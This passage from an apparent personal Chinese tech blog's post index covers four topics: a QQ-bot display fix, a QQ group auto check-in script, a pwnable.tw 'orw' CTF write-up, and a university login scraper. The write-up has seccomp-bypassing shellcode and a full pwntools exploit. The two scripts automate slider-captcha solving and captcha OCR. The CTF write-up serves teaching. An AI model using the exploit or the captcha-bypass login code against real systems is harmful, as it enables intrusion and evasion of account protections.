插件：只能显示到这样，拖拽到左侧也依然只能显示这些。而完整的插件界面应该是这样的。这样就导致这个插件无法保存、无法关闭(只能靠重启docker…555)而影响了插件的正常使用。问题解决方案:这个问题困扰我好几天了，各种Google也无果，酷Q社区的求助帖也看了好多，也没有对应症状。。。而且酷Q社区发求助帖需要权限…直到昨天我突发灵感，会不会和docker远程桌面的分辨率有关呢？这个远程桌面分辨率确实有点小。按照灵感，我通过命令行的形式设置了分辨率在docker远程桌面启动命令行通过命令xrandr查看支持的分辨率。然后随便选一个吧，1024×768应该就可以，不需要太大。由于1024×768是第一个，所以xrandr -s 11来选择第一个分辨率。设置好分辨率以后，再打开那个插件的配置界面，就能完整显示了!0x05 写在最后杂谈个人觉得开发一些插件用来完善自己的机器人是非常有趣的，可能我还是爱开发更多一点吧。虽然这只是一个QQ机器人，跟ATRI这种高性能机器人还差得远呢。但ATRI有可能是有生之年系列，或者有生之年世上已经有这样的机器人被生产制造出来了，但我可能买不起555科技飞速发展，谁又能预料到未来是什么模样的呢?也正是这种未知与神秘，才让生活充满了乐趣吧。ATRI 天下第一","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"[原创] QQ群自动签到脚本(已失效)","slug":"原创-QQ群自动签到脚本","date":"2020-07-03T13:45:22.000Z","updated":"2020-12-22T08:49:08.131Z","comments":true,"path":"2020/07/03/原创-QQ群自动签到脚本/","link":"","permalink":"http://liul14n.top/2020/07/03/原创-QQ群自动签到脚本/","excerpt":"","text":"0x00 前言2020年8月15，腾讯升级群功能，导致该脚本已失效！内容仅供参考。许久未更博。忽然想刷一下QQ的群聊等级，然后看了看升级的规则，有一项是群签到。通过群签到每天最多获得15积分。而群签到的“本群首签”会获得3积分，这样的话，自己准备5个群就能获得每天的积分了。当然如果想更快提高群聊等级，还可以每天向某个群上传十个文件。不过每天都运行这个脚本的话，还是比较麻烦的，所以直接弄成自动化的就好了。即把脚本挂到服务器上，设置成一个定时任务。 Nice~脚本是我自己写的，许多地方其实还是可以优化的，比如加一些异常捕获机制，但是懒…就没去弄。0x01 原理说明基于python的requests库和selenium库来实现各功能。通过抓包可以得知: Q群签到实际上是通过向URL ‘https://qun.qq.com/cgi-bin/qiandao/sign/publish&#39; 进行post传参。首先我们需要cookie中的两个主要部分：uin和skeyuin是根据QQ号来的，是不会变的，它有一个规律：如果你QQ号小于等于9位，则自动在前面补0凑成10位，然后在最前面补一个小写字母’o’；如果你QQ号是10位的，则只进行在最前面补’o’的操作。比如QQ号 123456789的uin 就是 o0123456789QQ号1122334455的uin就是o1122334455emmmm11位QQ的未进行测试，可自行测试。(登陆QQ空间看cookie即可)而skey是随机生成的，一般以字符‘@’开头，总长度好像是10位?还是11位来着…..这个也可以通过登陆QQ空间看cookie获取。曾经试过一段时间，手动登陆QQ空间拿到skey，然后用这个skey跑签到脚本，它只能用两天…. 至于是24小时还是48小时我也没去仔细测…毕竟就算能用一星期，来回手动换也是很麻烦的，而我的目的是实现全自动。而其他的一些参数123456789101112data = &#123; 'bkn': bkn,#这是根据skey按照一个算法生成的,等下会介绍 \"category_id\": 9,#类别ID,这是Q群签到的一个选项来着...抓包拿到的是9,可以自行更改 \"page\": 0,#好像和其他几个有关联? \"pic_id\": 124,#签到图片ID 'gc': gc,#QQ群号 'client': '2',#我也不知道,反正我抓包拿到的是2...应该能自行更改 'lgt': '0',#经度 'lat': '0',#纬度 'poi': '签到地点',#可以自行更改 'text': '你想说的话'#可以自行更改&#125;12345def Getgtk(self): hashes = 5381 for letter in self.skey: hashes += (hashes &lt;&lt; 5) + ord(letter) return hashes &amp; 0x7fffffff这个就是通过skey来求上面说的bkn参数的算法，来源于百度…经过测试，如果签到成功的话，打印出来的content为{&quot;cgicode&quot;:0,&quot;retcode&quot;:0,&quot;msg&quot;:&quot;&quot;,&quot;data&quot;:{}}，所以可以用这个进行判断是否签到成功…当然直接看QQ也可以…0x02 需要解决的几个困难如何自动获取skey?由于QQ空间登陆的时候有滑块验证，这里想用requests库来实现登陆并获取cookie并不太好弄。这里选择先用selenium库实现QQ空间登陆，获取到cookie（主要是获取cookie里的skey）后直接让requests库利用。（毕竟skey的生存期至少是24小时）非常幸运的是：QQ空间登陆的时候，滑块只需要拖动170到180之间某个像素位即可，这个值是随机的。我们取中位数175，然后借助selenium的ActionChains来模拟拖动滑块。因为是随机的，多试几次碰碰运气，总能成功的。挂到服务器上执行脚本并没有效果且未报错这个脚本早在几天前就写好了，但是挂到服务器上一直没有效果…我一直在找原因，直到昨天，我决定给服务器加个桌面化，通过VNC进行连接服务器，以可视化的方式看看到底出了什么问题。然后我发现，在拖动好滑块以后，还需要进行手机验证码验证…大概是腾讯出于安全的考虑，毕竟在服务器登录也算是异地登录…我尝试着进行了手机验证码验证，但是在下一次模拟登陆的时候依然是需要手机验证码登录…而且我也检查了我QQ的各种登录保护，确定没开登陆地保护和设备锁之类的保护措施。无奈之下，我尝试了进行二维码扫码登录，这不需要手机验证码验证，但是这不符合我的全自动化要求。多次尝试各种方法以后，依然需要手机验证码验证…过了许久，突发奇想，我在服务器(ubuntu18.04)借助远程连接图形化界面下载一个Linux版本的QQ，登陆几次，会不会解决这个问题。也可能是这个方法生效了，模拟登陆的时候不再需要手机验证码验证了。(o^_^o)0x03 脚本源码脚本所用python版本:2.7.17脚本由UserInfo.py与test.py组成，懒得改名了，就这么命名吧。其中UserInfo.py算是存放需要进行Q群签到的QQ的信息吧结构如下即 [ uin,QQ号,QQ密码,[需要签到的Q群list] ] 这种结构。test.py内容如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113# -*- coding: UTF-8 -*-import requestsimport timefrom selenium import webdriverfrom selenium.webdriver import ActionChainsfrom UserInfo import usersInfo__Author__ = 'LiuLian'class Sign: def __init__(self,uin,Qnum,Qpsd,QqunList): self.uin = uin self.skey = '' self.Qnum = Qnum self.Qpsd = Qpsd self.QqunList = QqunList def Getskey(self): count = 1 hasfound = False while True: print '[*]' + self.Qnum + ' 正在进行第' + str(count) +'次尝试...' opt = webdriver.ChromeOptions() opt.add_argument('--headless') opt.add_argument('--no-sandbox') driver = webdriver.Chrome(options=opt) time.sleep(1) driver.get('https://qzone.qq.com') #print driver.page_source.encode('utf-8') driver.switch_to.frame('login_frame') a_tag = driver.find_element_by_id('switcher_plogin') a_tag.click() userName_tag = driver.find_element_by_id('u') passWord_tag = driver.find_element_by_id('p') time.sleep(1) userName_tag.send_keys(self.Qnum) time.sleep(1) passWord_tag.send_keys(self.Qpsd) btn = driver.find_element_by_id(\"login_button\") btn.click() time.sleep(1) iframe = driver.find_element_by_xpath('//*[@id=\"tcaptcha_iframe\"]') # 找到“嵌套”的iframe driver.switch_to.frame(iframe) # 切换到iframe time.sleep(1) button = driver.find_element_by_id('tcaptcha_drag_button') # 寻找滑块 time.sleep(1) # 开始拖动 perform()用来执行ActionChains中存储的行为 distance = 175 action = ActionChains(driver) action.reset_actions() # 清除之前的action action.click_and_hold(button).perform() # click_and_hold 点击并保持 time.sleep(1) action.move_by_offset(distance, 0).release().perform() time.sleep(10) cookies = driver.get_cookies() for dic in cookies: if dic.values()[1] == u'skey': self.skey = dic.values()[2].encode(\"utf8\", \"ignore\") print '[+]' + self.Qnum + '的skey = ' + self.skey hasfound = True break # 退出浏览器 driver.quit() count += 1 if hasfound: break if count &gt; 100: print '[-] 失败太多次了! 终止..' self.skey = '5555555555' break def Getgtk(self): hashes = 5381 for letter in self.skey: hashes += (hashes &lt;&lt; 5) + ord(letter) return hashes &amp; 0x7fffffff def sign(self): self.Getskey() url = 'https://qun.qq.com/cgi-bin/qiandao/sign/publish' headers = &#123; 'Host':'qun.qq.com', 'Origin':'https://qun.qq.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045224 Mobile Safari/537.36 V1_AND_SQ_8.3.9_1424_YYB_D QQ/8.3.9.4635 NetType/4G WebP/0.3.0 Pixel/1080 StatusBarHeight/80 SimpleUISwitch/0 QQTheme/2081', 'Cookie': 'uin=' + self.uin + ';skey=' + self.skey &#125; bkn = self.Getgtk() for gc in self.QqunList: data = &#123; 'bkn': bkn,#这是根据skey按照一个算法生成的,等下会介绍 \"category_id\": 9,#类别ID,这是Q群签到的一个选项来着...抓包拿到的是9,可以自行更改 \"page\": 0,#好像和其他几个有关联? \"pic_id\": 124,#签到图片ID 'gc': gc,#QQ群号 'client': '2',#我也不知道,反正我抓包拿到的是2...应该能自行更改 'lgt': '0',#经度 'lat': '0',#纬度 'poi': '签到地点',#可以自行更改 'text': '你想说的话'#可以自行更改 &#125; if requests.post(url=url, data=data, headers=headers).content \\ == '&#123;\"cgicode\":0,\"retcode\":0,\"msg\":\"\",\"data\":&#123;&#125;&#125;': print '[+] ' + time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) \\ + 'QQ:' + self.uin[1:] + ' 群号:' + gc + '签到成功!' else: print '[-] ' + time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) \\ + 'QQ:' + self.uin[1:] + ' 群号:' + gc + '签到失败!'if __name__ == '__main__': for userInfo in usersInfo: test = Sign(userInfo[0],userInfo[1],userInfo[2],userInfo[3]) test.sign()0x04 挂载到服务器要现在服务器安装好脚本所需的必要环境：python2.7、requests库、selenium库及其对应的google-chrome和chromedriver，具体不再多说。设置定时任务:这里采用linux的 crontab 。阿里云的服务器自带…其他的服务器自带与否我也不清楚执行sudo vim /etc/crontab来编辑设置定时任务最后一行才是我自己设置的，其余全是服务器本身设置的。最后一行表示每天早上6点以root权限执行该脚本，并将输出信息追加保存到我的log文件中，log文件自己创就行…保不保存其实都可以，看自己选择了。这些路径根据自己的实际路径修改就行。0x05 写在最后懒惰是人类发展的第一生产力，如果我不是个懒狗，我也不会想着去写这个脚本。","categories":[{"name":"开发","slug":"开发","permalink":"http://liul14n.top/categories/开发/"}],"tags":[]},{"title":"Pwnable_orw","slug":"Pwnable-orw","date":"2020-05-18T16:02:22.000Z","updated":"2020-05-19T15:40:45.920Z","comments":true,"path":"2020/05/19/Pwnable-orw/","link":"","permalink":"http://liul14n.top/2020/05/19/Pwnable-orw/","excerpt":"","text":"0x00 前言咕了许久，重拾本就会的不多的pwn，发现不太顺手了。之前也接触过ORW的题目，但没去深入的了解其细节，只抄了个EXP拿了个flag就完事了。今天用这道题目详细记录一下ORW类型的题目。题目原出处是在pwnable.tw， BUUCTF上面也有。0x01 题目分析保护与main函数123456Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments主函数逻辑也特别简单，读取我们的输入存到变量shellcode处，然后执行shellcode()。如果忽视掉第3行的orw_seccomp()那么就可以直接向程序输入一段shellcode就能getshell。seccomp第3行的内容也便是ORW这类题目的重点所在。关于seccomp：seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。seccomp 简单来说就是一个白名单，每个进程进行系统调用（system call）时，kernal 都会检查对应的白名单以确认该进程是否有权限使用这个系统调用。这个白名单是用 berkeley package filter（BPF）格式书写的。具体可以参考如下链接：大佬的博客CSDNPS: 第一个博客里也讲到了这道题目是如何实现seccomp的了，是与prctl有关。PS: 而我第一次遇到ORW的题目是在极客大挑战2019 的 babyshellcode和Not bad这俩题目，这俩题目都是通过seccomp_rule_add来实现seccomp的。也就是说，这个程序相当于禁用了system。这段程序中，unk_8048640位置存储的即为“白名单”，通过这个白名单，可以看到这个程序允许的系统调用。之前看到过一篇博文，有师傅手动把这个白名单提取出来了，但是我找不到博文链接了。工具seccomp-tools用工具seccomp-tools能更直观更便捷的查看这个“白名单”。安装seccomp-tools步骤(环境Ubuntu 16.04)：首先需要gem和ruby(版本&gt;=2.4)：我用的阿里云的源，通过apt-get 安装的ruby版本是2.3，死活安不上2.4，Google了一番找到了安装方法：12345$ sudo apt-add-repository ppa:brightbox/ruby-ng$ sudo apt-get update$ sudo apt-get install ruby2.4 ruby2.4-dev然后sudo gem install seccomp-tools即可。终端执行命令$ seccomp-tools dump ./orw即可查看“白名单”绿色的即为允许的系统调用。可以看到该程序可以进行open read write等系统调用。解题思路结合前面的分析，这道题目的解题策略可以确定为ORW即open、read、write，也就是先打开存放flag的文件，将其内容读取到某块缓冲区，然后通过write打印出来。0x02 Do it！关于系统调用对于32位来说：12345系统调用号：EAX参数：EBX、ECX、EDX、ESI、EDI、EBP返回值：EAX对于64位来说：12345系统调用号：RAX参数：RDI、RSI、RDX、R10、R8、R9返回值：RAX对于我们的ORW（32位）来说：系统调用号:eaxNameargs1:ebxargs2:ecxargs3:edx3sys_readunsigned int fdchar *bufsize_t count4sys_writeunsigned int fdchar *bufsize_t count5sys_openchar __user *filenameint flagsint mode编写shellcode首先我们需要open，由于BUUOJ上面存放flag的文件名就叫flag，这也就为我们open提供了便利。12345678910111213141516171819202122232425//open(flag,0,0)mopen = &apos;&apos;&apos;mov eax,5;xor ecx,ecx;xor edx,edx;push 0; \\x00 用于截断字符串(flag)push 0x67616C66; flag的小端序写法mov ebx,esp; esp指向字符串&quot;flag\\0&quot;int 0x80;&apos;&apos;&apos;//read(fd,esp,0x50) fd即open的返回值，存在eax中。mread = &apos;&apos;&apos;mov ecx,ebx; esp处用作缓冲区读取flagmov ebx,eax; eax为open的返回值，即读取到的文件的file ID(如果读取失败则返回-1)mov eax,3;mov edx,0x50;int 0x80;&apos;&apos;&apos;//write(1,esp,0x50)mwrite = &apos;&apos;&apos;mov eax,4;mov ebx,1; 文件描述符 stdoutmov edx,0x50;int 0x8&apos;&apos;&apos;这段汇编应该挺容易理解的，然后就没啥难点了…同样还可以利用pwntools的shellcraft来构造，需要指明context.arch，32位就i386,64位就amd6412345sh = shellcraft.pushstr('flag')sh += shellcraft.syscall('SYS_open',\"esp\",0)sh += shellcraft.syscall('SYS_read','eax','esp',0x50)sh += shellcraft.syscall('SYS_write',1,'esp',0x50)sh = asm(sh)0x03完整EXP1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context(arch = 'i386',os = 'linux')c = process('./orw')#c = remote('node3.buuoj.cn',26916)#gdb.attach(c,'b*0x804858A')c.recvuntil('Give my your shellcode:')mopen = '''mov eax,5;xor ecx,ecx;xor edx,edx;push 0;push 0x67616C66;mov ebx,esp;int 0x80;'''mread = '''mov ecx,ebx;mov ebx,eax;mov eax,3;mov edx,0x50;int 0x80;'''mwrite = '''mov eax,4;mov ebx,1;mov edx,0x50;int 0x80;'''sh = asm(mopen) + asm(mread) + asm(mwrite)print hex(len(sh))c.sendline(sh)c.interactive()这段EXP在BUUOJ上是可以打通的，如果想在pwnable.tw打通，需要修改一下 open 那块的汇编，应该向ebx传入flag文件的绝对路径。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[Python]一次爬虫模拟登录的尝试","slug":"Python-一次爬虫模拟登录的尝试","date":"2020-04-01T18:22:10.000Z","updated":"2020-12-22T08:49:31.962Z","comments":true,"path":"2020/04/02/Python-一次爬虫模拟登录的尝试/","link":"","permalink":"http://liul14n.top/2020/04/02/Python-一次爬虫模拟登录的尝试/","excerpt":"","text":"0x00 前言最近想学一下爬虫的进阶用法，比如模拟登录之类的，在网上找的教程里面所用的测试网站现在已经加了反爬虫机制，目前我还太菜，还过不了反爬机制。但是忽然想到了学校还有个垃圾强智系统，漏洞百出，应该也不会加反爬机制，所以拿强智练练手。0x01 用浏览器初探信息搜集这里只需用Chrome浏览器的开发者工具(F12)，也不需要用BP之类的抓包工具打开网站，强智-山东科技大学，打开开发者工具–Network–勾上Preserve log，然后用自己的账号登录。然后可以看到有挺多信息的，这里有几个关键的信息:12345678Request URL: http://jwgl.sdust.edu.cn/Logon.do?method=logonRequest Method: POSTOrigin: http://jwgl.sdust.edu.cnReferer: http://jwgl.sdust.edu.cn/User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36encoded: *******************************************************RANDOMCODE: cn3v这些信息向我们指明了真实请求的URL、请求方法、Origin、Referer、User-Agent、Post所传参数。陷入困境这里post所传参数与我想象的有所不同，我以为会传入用户名、密码、验证码，但是实际上只有一个encoded和验证码。盲猜可能通过某种加密方法将用户名和密码加密成了encoded，因为我从这个encoded里面看到了我密码的一部分，而且密码像插队一样插在encoded中。多次重新登录并查看这个encoded发现这个值是会变的，也就是说加密算法应该是有一个动态的参照，或者是随机数种子（结合一些web知识，随机数种子不太现实）？那么该如何通过用户名和密码来得到这个encoded？柳暗花明困扰了一会以后，我看了一下网页源码，我看到了一段令我惊喜的代码。这里写了encoded的生成算法，果然是由用户名和密码以及dataStr计算得来。dataStr是通过/Logon.do?method=logon&amp;flag=sess生成的dataStr生成网址。刷新几次可以看到每次生成的结果都不同。把JS代码转化成Python代码即可得到encoded。0x02 用爬虫初探获取验证码从网页源码里面可以看到，验证码是在这个网站获取的验证码网站那么我们同样可以去这个网站获取验证码，由于我现在还没法很完美的实现验证码的自动识别，这里采用将二维码show出来手工输入的办法。Session由于验证码生成网站和dataStr生成网站每次刷新，里面内容都会不同那么我们该如何实现爬虫传的参数 与 我们生成的dataStr和验证码的统一？这里通过创建session对象来实现统一。如何测试是否登录成功可以打印一下post以后的内容，看看是不是和用浏览器登录进去的一样，不能通过看post的state_code。代码(demo)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# -*- coding: UTF-8 -*-import requestsimport reimport osfrom PIL import Imageclass Spider(): def __init__(self): self.headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36', 'Referer': 'http://jwgl.sdust.edu.cn/' &#125; self.seesion = requests.session() print '[+] Session初始化完成!' self.userAccount = raw_input('请输入学号:') self.userPassword = raw_input('请输入密码:') self.dataStr = '' self.safeCode = '' self.encoded = '' def get_dataStr(self): dataStrUrl = 'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess' self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content print '[+] dataStr 已获取!' def get_safeCode(self): safeCodeUrl = 'http://jwgl.sdust.edu.cn/verifycode.servlet' safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content f = open('safeCode.jpg','wb') f.write(safeCodeCont) f.close() img = Image.open('safeCode.jpg') img.show() safeCode = raw_input('请输入验证码:') os.remove('safeCode.jpg') self.safeCode = safeCode print '[+] 验证码已获取!' def get_encoded(self): scode = self.dataStr.split('#')[0] sxh = self.dataStr.split('#')[1] code = self.userAccount + '%%%' + self.userPassword encode = '' i = 0 while i &lt; len(code): if i &lt; 20: encode += code[i:i + 1] + scode[0:int(sxh[i:i + 1])] scode = scode[int(sxh[i:i + 1]):len(scode)] else: encode += code[i:len(code)] i = len(code) i += 1 self.encoded = encode print '[+] encoded已获取!' def login(self): loginUrl = 'http://jwgl.sdust.edu.cn/Logon.do?method=logon' self.get_dataStr() self.get_safeCode() self.get_encoded() login_data = &#123; 'encoded': self.encoded, 'RANDOMCODE': self.safeCode &#125; print self.seesion.post(url = loginUrl,data = login_data,headers = self.headers).contentif __name__ == '__main__': test = Spider() test.login()放一张表明登录成功的截图吧。代码2(demo)4月3号更新了一些小功能，做了一些优化，但程序依然还只是个雏形。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110# -*- coding: UTF-8 -*-import requestsimport webbrowserimport reimport osimport timefrom PIL import Image__Author__ = 'LiuLian'# 测试环境Python2.7.16# Create for fun!class Spider(): def __init__(self): self.headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36', 'Referer': 'http://jwgl.sdust.edu.cn/' &#125; self.seesion = requests.session() print('[+] Session初始化完成!') self.userAccount = raw_input('请输入学号:') self.userPassword = raw_input('请输入密码:') self.dataStr = '' self.safeCode = '' self.encoded = '' def get_dataStr(self): dataStrUrl = 'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess' self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content print('[+] dataStr 已获取!') def get_safeCode(self): safeCodeUrl = 'http://jwgl.sdust.edu.cn/verifycode.servlet' safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content f = open('safeCode.jpg', 'wb') f.write(safeCodeCont) f.close() img = Image.open('safeCode.jpg') img.show() safeCode = raw_input('请输入验证码:') os.remove('safeCode.jpg') self.safeCode = safeCode print('[+] 验证码已获取!') def get_encoded(self): scode = self.dataStr.split('#')[0] sxh = self.dataStr.split('#')[1] code = self.userAccount + '%%%' + self.userPassword encode = '' i = 0 while i &lt; len(code): if i &lt; 20: encode += code[i:i + 1] + scode[0:int(sxh[i:i + 1])] scode = scode[int(sxh[i:i + 1]):len(scode)] else: encode += code[i:len(code)] i = len(code) i += 1 self.encoded = encode print('[+] encoded已获取!') def login(self): loginUrl = 'http://jwgl.sdust.edu.cn/Logon.do?method=logon' self.get_dataStr() self.get_safeCode() self.get_encoded() login_data = &#123; 'encoded': self.encoded, 'RANDOMCODE': self.safeCode &#125; while True: html = self.seesion.post(url=loginUrl, data=login_data, headers=self.headers).content if html.find('&lt;title&gt;学生个人中心&lt;/title&gt;') != -1: print('[+] 登录成功! :)\\n姓名、学号如下:') pattern = r'&lt;div id=\"Top1_divLoginName\" class=\"Nsb_top_menu_nc\" style=\"color: #000000;\"&gt;(.+?)&lt;/div&gt;' name_num = re.findall(pattern=pattern,string=html)[0].decode('utf-8') print(name_num) break elif html.find('&lt;font color=\"red\"&gt;验证码无效,请重新登录!&lt;/font&gt;') != -1: print('[-] 验证码输入错误 :(,请重试该程序...') time.sleep(2) exit(0) else: print('[-] 登录失败 :( ,正在尝试重新登录...') time.sleep(1) continue def get_class_schedule(self): \"获得学期理论课表并展示\" class_schedule_url = 'http://jwgl.sdust.edu.cn/jsxsd/xskb/xskb_list.do?Ves632DSdyV=NEW_XSD_PYGL' f = open('schedule.html', 'wb') html = self.seesion.get(url=class_schedule_url, headers=self.headers).content f.write(html) f.close() webbrowser.open('schedule.html') # os.remove('schedule.html') def Teacher_evaluation(self): \"进行教师评价\" evaluation_url = 'http://jwgl.sdust.edu.cn/jsxsd/xspj/xspj_find.do?Ves632DSdyV=NEW_XSD_JXPJ' def Robbing_class(self): \"抢课\" robbing_url = 'http://jwgl.sdust.edu.cn/jsxsd/xsxkRedis/xklc_list?Ves632DSdyV=NEW_XSD_PYGL'if __name__ == '__main__': test = Spider() test.login() test.get_class_schedule()代码3(demo)一次偶然的机会在网上找到了一个关于过强智网站验证码识别的代码。比较特殊，强智的验证码里面只有123zxcvbnm这些字符，因此过验证码的难度大大降低。12345678910111213141516171819202122232425#orc.pyfrom PIL import Imagefrom char_lists import charsdef identify(img): identification_code_temp=[];identification_code=['']*4;diff_min=[144]*4; for i in range (4): identification_code_temp.append(img.crop((i*10, 0, i*10+13, 12)).getdata()) for char in chars: diff = [0]*4 for i in range(4): for j in range(156): if identification_code_temp[i][j] ^ chars[char][j]: diff[i] += 1 for i in range(4): if diff[i]&lt;diff_min[i]: diff_min[i]=diff[i] identification_code[i]=char return ''.join(identification_code)def identificationCodeHandle(img): rect_box = (3,4,46,16) img = img.crop(rect_box) img = img.convert('1') return img12345678910111213#char_lists.pychars = &#123; '1':[255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255], '2':[255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255], '3':[255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255], 'z':[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255], 'x':[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255], 'c':[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 